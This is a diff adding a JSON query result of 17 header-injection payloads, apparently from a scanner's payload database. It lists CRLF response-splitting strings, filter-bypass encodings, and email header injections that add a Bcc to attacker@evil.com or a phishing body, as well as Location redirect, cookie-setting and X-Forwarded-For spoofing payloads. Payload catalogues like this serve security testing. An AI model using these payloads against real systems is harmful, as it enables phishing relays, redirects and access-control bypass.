@@ -1,0 +1,299 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 3,
+    "vuln_type": "header_injection"
+  },
+  "count": 17,
+  "results": [
+    {
+      "id": "1d41a62bedd011ff",
+      "payload": "%E5%98%8A%E5%98%8DX-Injected: true",
+      "technique": "crlf_injection",
+      "injection_surface": "query",
+      "encoding": "unicode",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Unicode CRLF bypass — UTF-8 encoded CR+LF (U+560A, U+560D). Bypasses ASCII-only CRLF filters.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "crlf",
+        "unicode"
+      ]
+    },
+    {
+      "id": "1e260f4955a400da",
+      "payload": "value%0d%0aX-Injected: true",
+      "technique": "crlf_injection",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CRLF injection via HTTP request header value.",
+      "source": "ensphere",
+      "tags": [
+        "crlf",
+        "header_value",
+        "injection"
+      ]
+    },
+    {
+      "id": "2fbd17a47247126d",
+      "payload": "%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a\u003chtml\u003einjected\u003c/html\u003e",
+      "technique": "crlf_injection",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Full HTTP response injection via CRLF. Attempt to create second response.",
+      "source": "ensphere",
+      "tags": [
+        "crlf",
+        "full",
+        "response_injection"
+      ]
+    },
+    {
+      "id": "36b53a99f0f81b1b",
+      "payload": "value%0d%0aX-Injected: true",
+      "technique": "crlf_injection",
+      "injection_surface": "cookie",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CRLF injection via cookie value.",
+      "source": "ensphere",
+      "tags": [
+        "cookie",
+        "crlf",
+        "injection"
+      ]
+    },
+    {
+      "id": "4c906cba5a8e642a",
+      "payload": "test%0d%0aX-Forwarded-For:%20127.0.0.1",
+      "technique": "crlf_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CRLF injection to spoof X-Forwarded-For header. May bypass IP-based restrictions.",
+      "source": "ensphere",
+      "tags": [
+        "crlf",
+        "ip_spoof",
+        "xff"
+      ]
+    },
+    {
+      "id": "5a40de6e82a83911",
+      "payload": "victim@example.com\r\nBcc: attacker@evil.com",
+      "technique": "email_header_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Email header injection with raw CRLF characters.",
+      "source": "ensphere",
+      "tags": [
+        "bcc",
+        "email",
+        "raw_crlf"
+      ]
+    },
+    {
+      "id": "5bab3d2a0cc0c705",
+      "payload": "/%0d%0aX-Injected:%20true",
+      "technique": "crlf_injection",
+      "injection_surface": "path",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CRLF injection via URL path segment.",
+      "source": "ensphere",
+      "tags": [
+        "crlf",
+        "injection",
+        "path"
+      ]
+    },
+    {
+      "id": "6bddfe5a4e66aad3",
+      "payload": "%250d%250aX-Injected: true",
+      "technique": "crlf_injection",
+      "injection_surface": "query",
+      "encoding": "double_url",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Double URL-encoded CRLF. Bypasses single-decode filters.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "crlf",
+        "double_url"
+      ]
+    },
+    {
+      "id": "6de3075dad7b5df9",
+      "payload": "victim@example.com%0d%0aSubject: Phishing%0d%0a%0d%0aMalicious body",
+      "technique": "email_header_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Email header injection — override subject and inject body content.",
+      "source": "ensphere",
+      "tags": [
+        "body_injection",
+        "email",
+        "subject"
+      ]
+    },
+    {
+      "id": "76608abde5477ca8",
+      "payload": "%0aX-Injected: true",
+      "technique": "crlf_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "LF-only header injection. Some servers accept bare LF as header delimiter.",
+      "source": "ensphere",
+      "tags": [
+        "crlf",
+        "header",
+        "lf_only"
+      ]
+    },
+    {
+      "id": "848ba56fa9b72351",
+      "payload": "victim@example.com%0aBcc: attacker@evil.com",
+      "technique": "email_header_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Email header injection with LF-only line ending.",
+      "source": "ensphere",
+      "tags": [
+        "bcc",
+        "email",
+        "lf_only"
+      ]
+    },
+    {
+      "id": "92d7d0b0760e19b6",
+      "payload": "%0d%0aLocation: https://evil.com",
+      "technique": "crlf_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CRLF injection to inject Location header for redirect.",
+      "source": "ensphere",
+      "tags": [
+        "crlf",
+        "location",
+        "redirect"
+      ]
+    },
+    {
+      "id": "9d227fcf11aa8c27",
+      "payload": "%0d%0aX-Injected: true",
+      "technique": "crlf_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CRLF injection via URL-encoded CR+LF. Check if X-Injected appears in response headers.",
+      "source": "ensphere",
+      "tags": [
+        "crlf",
+        "header",
+        "response_splitting"
+      ]
+    },
+    {
+      "id": "ab72eceaa4f2d5f2",
+      "payload": "application/json%0d%0aX-Injected: true",
+      "technique": "crlf_injection",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CRLF injection via Content-Type header value.",
+      "source": "ensphere",
+      "tags": [
+        "content_type",
+        "crlf",
+        "injection"
+      ]
+    },
+    {
+      "id": "b6984c6238af9d9b",
+      "payload": "%0d%0aSet-Cookie: injected=1",
+      "technique": "crlf_injection",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "header_match",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "CRLF injection to set arbitrary cookie.",
+      "source": "ensphere",
+      "tags": [
+        "crlf",
+        "header",
+        "set_cookie"
+      ]
+    },
+    {
+      "id": "bb5f827cac871e78",
+      "payload": "victim@example.com%0d%0aBcc: attacker@evil.com",
+      "technique": "email_header_injection",
+      "injection_surface": "form_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Email header injection — inject BCC header to receive copy of email.",
+      "source": "ensphere",
+      "tags": [
+        "bcc",
+        "email",
+        "injection"
+      ]
+    },
+    {
+      "id": "f4bdba698b6f041a",
+      "payload": "victim@example.com\\r\\nBcc: attacker@evil.com",
+      "technique": "email_header_injection",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "status_diff",
+      "risk": 3,
+      "placeholders": [],
+      "notes": "Email header injection via JSON body (escaped CRLF).",
+      "source": "ensphere",
+      "tags": [
+        "bcc",
+        "email",
+        "json"
+      ]
+    }
+  ]
+}
